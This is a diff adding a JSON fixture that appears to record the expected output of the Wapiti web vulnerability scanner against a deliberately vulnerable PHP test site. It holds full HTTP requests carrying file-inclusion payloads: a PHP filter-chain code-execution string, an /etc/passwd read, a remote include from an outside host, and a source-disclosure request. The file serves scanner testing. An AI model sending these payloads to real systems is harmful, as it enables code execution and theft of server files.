@@ -1,0 +1,517 @@
+{
+    "vulnerabilities": {
+        "Path Traversal": [
+            {
+                "method": "GET",
+                "path": "/code_execution.php",
+                "info": "PHP local inclusion leading to code execution via injection in the parameter file",
+                "parameter": "file",
+                "module": "file",
+                "http_request": "GET /code_execution.php?file=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp HTTP/1.1\nhost: file\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "wstg": [
+                    "WSTG-ATHZ-01"
+                ]
+            },
+            {
+                "method": "GET",
+                "path": "/local_file_disclosure.php",
+                "info": "Linux local file disclosure vulnerability via injection in the parameter file",
+                "parameter": "file",
+                "module": "file",
+                "http_request": "GET /local_file_disclosure.php?file=%2Fetc%2Fpasswd HTTP/1.1\nhost: file\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "wstg": [
+                    "WSTG-ATHZ-01"
+                ]
+            },
+            {
+                "method": "GET",
+                "path": "/local_file_disclosure.php",
+                "info": "Possible include() vulnerability via injection in the parameter file",
+                "parameter": "file",
+                "module": "file",
+                "http_request": "GET /local_file_disclosure.php?file=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1\nhost: file\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "wstg": [
+                    "WSTG-ATHZ-01"
+                ]
+            },
+            {
+                "method": "GET",
+                "path": "/source_code_disclosure.php",
+                "info": "Possible source code disclosure via injection in the parameter file",
+                "parameter": "file",
+                "module": "file",
+                "http_request": "GET /source_code_disclosure.php?file=source_code_disclosure.php HTTP/1.1\nhost: file\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "wstg": [
+                    "WSTG-ATHZ-01"
+                ]
+            }
+        ]
+    },
+    "infos": {
+        "target": "http://file/",
+        "crawled_pages": [
+            {
+                "request": {
+                    "url": "http://file/",
+                    "method": "GET",
+                    "headers": [
+                        [
+                            "accept",
+                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+                        ],
+                        [
+                            "accept-encoding",
+                            "gzip, deflate, br"
+                        ],
+                        [
+                            "accept-language",
+                            "en-US"
+                        ],
+                        [
+                            "connection",
+                            "keep-alive"
+                        ],
+                        [
+                            "host",
+                            "file"
+                        ],
+                        [
+                            "user-agent",
+                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
+                        ]
+                    ]
+                },
+                "response": {
+                    "status_code": 200,
+                    "body": "<!DOCTYPE html>\n<html>\n<head>\n\t<title>Index</title>\n</head>\n<body>\n\t<h1>Index</h1>\n\t<p>This is a simple PHP web page.</p>\n    <ul>\n        <li><a href=\"local_file_disclosure.php?file=inject\">Local file disclosure</a></li>\n        <li><a href=\"code_execution.php?file=inject\">code execution</a></li>\n        <li><a href=\"source_code_disclosure.php?file=inject\">source code disclosure</a></li>\n        </ul>\n</body>\n</html>\n",
+                    "headers": [
+                        [
+                            "connection",
+                            "Keep-Alive"
+                        ],
+                        [
+                            "content-encoding",
+                            "gzip"
+                        ],
+                        [
+                            "content-length",
+                            "230"
+                        ],
+                        [
+                            "content-type",
+                            "text/html; charset=UTF-8"
+                        ],
+                        [
+                            "server",
+                            "Apache/2.4.56 (Debian)"
+                        ],
+                        [
+                            "vary",
+                            "Accept-Encoding"
+                        ],
+                        [
+                            "x-powered-by",
+                            "PHP/8.1.18"
+                        ]
+                    ]
+                }
+            },
+            {
+                "request": {
+                    "url": "http://file/code_execution.php",
+                    "method": "GET",
+                    "headers": [
+                        [
+                            "accept",
+                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+                        ],
+                        [
+                            "accept-encoding",
+                            "gzip, deflate, br"
+                        ],
+                        [
+                            "accept-language",
+                            "en-US"
+                        ],
+                        [
+                            "connection",
+                            "keep-alive"
+                        ],
+                        [
+                            "host",
+                            "file"
+                        ],
+                        [
+                            "user-agent",
+                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
+                        ]
+                    ]
+                },
+                "response": {
+                    "status_code": 200,
+                    "body": "<!DOCTYPE html>\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <title>File Injections</title>\n    </head>\n    <body>\n        <p>Here you can use the file attribute to show source of files</p>\n        <p>path to local files are sanitized, you can still inject remote PHP payload</p>\n    </body>\n</html>\n\n",
+                    "headers": [
+                        [
+                            "connection",
+                            "Keep-Alive"
+                        ],
+                        [
+                            "content-encoding",
+                            "gzip"
+                        ],
+                        [
+                            "content-length",
+                            "211"
+                        ],
+                        [
+                            "content-type",
+                            "text/html; charset=UTF-8"
+                        ],
+                        [
+                            "server",
+                            "Apache/2.4.56 (Debian)"
+                        ],
+                        [
+                            "vary",
+                            "Accept-Encoding"
+                        ],
+                        [
+                            "x-powered-by",
+                            "PHP/8.1.18"
+                        ]
+                    ]
+                }
+            },
+            {
+                "request": {
+                    "url": "http://file/code_execution.php",
+                    "method": "GET",
+                    "headers": [
+                        [
+                            "accept",
+                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+                        ],
+                        [
+                            "accept-encoding",
+                            "gzip, deflate, br"
+                        ],
+                        [
+                            "accept-language",
+                            "en-US"
+                        ],
+                        [
+                            "connection",
+                            "keep-alive"
+                        ],
+                        [
+                            "host",
+                            "file"
+                        ],
+                        [
+                            "user-agent",
+                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
+                        ]
+                    ]
+                },
+                "response": {
+                    "status_code": 200,
+                    "body": "<!DOCTYPE html>\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <title>File Injections</title>\n    </head>\n    <body>\n        <p>Here you can use the file attribute to show source of files</p>\n        <p>path to local files are sanitized, you can still inject remote PHP payload</p>\n    </body>\n</html>\n\n",
+                    "headers": [
+                        [
+                            "connection",
+                            "Keep-Alive"
+                        ],
+                        [
+                            "content-encoding",
+                            "gzip"
+                        ],
+                        [
+                            "content-length",
+                            "211"
+                        ],
+                        [
+                            "content-type",
+                            "text/html; charset=UTF-8"
+                        ],
+                        [
+                            "server",
+                            "Apache/2.4.56 (Debian)"
+                        ],
+                        [
+                            "vary",
+                            "Accept-Encoding"
+                        ],
+                        [
+                            "x-powered-by",
+                            "PHP/8.1.18"
+                        ]
+                    ]
+                }
+            },
+            {
+                "request": {
+                    "url": "http://file/local_file_disclosure.php",
+                    "method": "GET",
+                    "headers": [
+                        [
+                            "accept",
+                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+                        ],
+                        [
+                            "accept-encoding",
+                            "gzip, deflate, br"
+                        ],
+                        [
+                            "accept-language",
+                            "en-US"
+                        ],
+                        [
+                            "connection",
+                            "keep-alive"
+                        ],
+                        [
+                            "host",
+                            "file"
+                        ],
+                        [
+                            "user-agent",
+                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
+                        ]
+                    ]
+                },
+                "response": {
+                    "status_code": 200,
+                    "body": "<!DOCTYPE html>\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <title>File Injections</title>\n    </head>\n    <body>\n        <p>Here you can use the file attribute to include files</p>\n    </body>\n</html>\n\n",
+                    "headers": [
+                        [
+                            "connection",
+                            "Keep-Alive"
+                        ],
+                        [
+                            "content-encoding",
+                            "gzip"
+                        ],
+                        [
+                            "content-length",
+                            "161"
+                        ],
+                        [
+                            "content-type",
+                            "text/html; charset=UTF-8"
+                        ],
+                        [
+                            "server",
+                            "Apache/2.4.56 (Debian)"
+                        ],
+                        [
+                            "vary",
+                            "Accept-Encoding"
+                        ],
+                        [
+                            "x-powered-by",
+                            "PHP/8.1.18"
+                        ]
+                    ]
+                }
+            },
+            {
+                "request": {
+                    "url": "http://file/local_file_disclosure.php",
+                    "method": "GET",
+                    "headers": [
+                        [
+                            "accept",
+                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+                        ],
+                        [
+                            "accept-encoding",
+                            "gzip, deflate, br"
+                        ],
+                        [
+                            "accept-language",
+                            "en-US"
+                        ],
+                        [
+                            "connection",
+                            "keep-alive"
+                        ],
+                        [
+                            "host",
+                            "file"
+                        ],
+                        [
+                            "user-agent",
+                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
+                        ]
+                    ]
+                },
+                "response": {
+                    "status_code": 200,
+                    "body": "<br />\n<b>Warning</b>:  include(inject): Failed to open stream: No such file or directory in <b>/var/www/html/local_file_disclosure.php</b> on line <b>4</b><br />\n<br />\n<b>Warning</b>:  include(): Failed opening 'inject' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/local_file_disclosure.php</b> on line <b>4</b><br />\n<!DOCTYPE html>\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <title>File Injections</title>\n    </head>\n    <body>\n        <p>Here you can use the file attribute to include files</p>\n    </body>\n</html>\n\n",
+                    "headers": [
+                        [
+                            "connection",
+                            "Keep-Alive"
+                        ],
+                        [
+                            "content-encoding",
+                            "gzip"
+                        ],
+                        [
+                            "content-length",
+                            "308"
+                        ],
+                        [
+                            "content-type",
+                            "text/html; charset=UTF-8"
+                        ],
+                        [
+                            "server",
+                            "Apache/2.4.56 (Debian)"
+                        ],
+                        [
+                            "vary",
+                            "Accept-Encoding"
+                        ],
+                        [
+                            "x-powered-by",
+                            "PHP/8.1.18"
+                        ]
+                    ]
+                }
+            },
+            {
+                "request": {
+                    "url": "http://file/source_code_disclosure.php",
+                    "method": "GET",
+                    "headers": [
+                        [
+                            "accept",
+                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+                        ],
+                        [
+                            "accept-encoding",
+                            "gzip, deflate, br"
+                        ],
+                        [
+                            "accept-language",
+                            "en-US"
+                        ],
+                        [
+                            "connection",
+                            "keep-alive"
+                        ],
+                        [
+                            "host",
+                            "file"
+                        ],
+                        [
+                            "user-agent",
+                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
+                        ]
+                    ]
+                },
+                "response": {
+                    "status_code": 200,
+                    "body": "<!DOCTYPE html>\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <title>File Injections</title>\n    </head>\n    <body>\n        <p>Here you can use the file attribute to show source of files</p>\n        <p>path to local files are sanitized, you can still view source code of the website</p>\n    </body>\n</html>\n\n",
+                    "headers": [
+                        [
+                            "connection",
+                            "Keep-Alive"
+                        ],
+                        [
+                            "content-encoding",
+                            "gzip"
+                        ],
+                        [
+                            "content-length",
+                            "210"
+                        ],
+                        [
+                            "content-type",
+                            "text/html; charset=UTF-8"
+                        ],
+                        [
+                            "server",
+                            "Apache/2.4.56 (Debian)"
+                        ],
+                        [
+                            "vary",
+                            "Accept-Encoding"
+                        ],
+                        [
+                            "x-powered-by",
+                            "PHP/8.1.18"
+                        ]
+                    ]
+                }
+            },
+            {
+                "request": {
+                    "url": "http://file/source_code_disclosure.php",
+                    "method": "GET",
+                    "headers": [
+                        [
+                            "accept",
+                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+                        ],
+                        [
+                            "accept-encoding",
+                            "gzip, deflate, br"
+                        ],
+                        [
+                            "accept-language",
+                            "en-US"
+                        ],
+                        [
+                            "connection",
+                            "keep-alive"
+                        ],
+                        [
+                            "host",
+                            "file"
+                        ],
+                        [
+                            "user-agent",
+                            "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
+                        ]
+                    ]
+                },
+                "response": {
+                    "status_code": 200,
+                    "body": "non<!DOCTYPE html>\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <title>File Injections</title>\n    </head>\n    <body>\n        <p>Here you can use the file attribute to show source of files</p>\n        <p>path to local files are sanitized, you can still view source code of the website</p>\n    </body>\n</html>\n\n",
+                    "headers": [
+                        [
+                            "connection",
+                            "Keep-Alive"
+                        ],
+                        [
+                            "content-encoding",
+                            "gzip"
+                        ],
+                        [
+                            "content-length",
+                            "214"
+                        ],
+                        [
+                            "content-type",
+                            "text/html; charset=UTF-8"
+                        ],
+                        [
+                            "server",
+                            "Apache/2.4.56 (Debian)"
+                        ],
+                        [
+                            "vary",
+                            "Accept-Encoding"
+                        ],
+                        [
+                            "x-powered-by",
+                            "PHP/8.1.18"
+                        ]
+                    ]
+                }
+            }
+        ]
+    }
+}
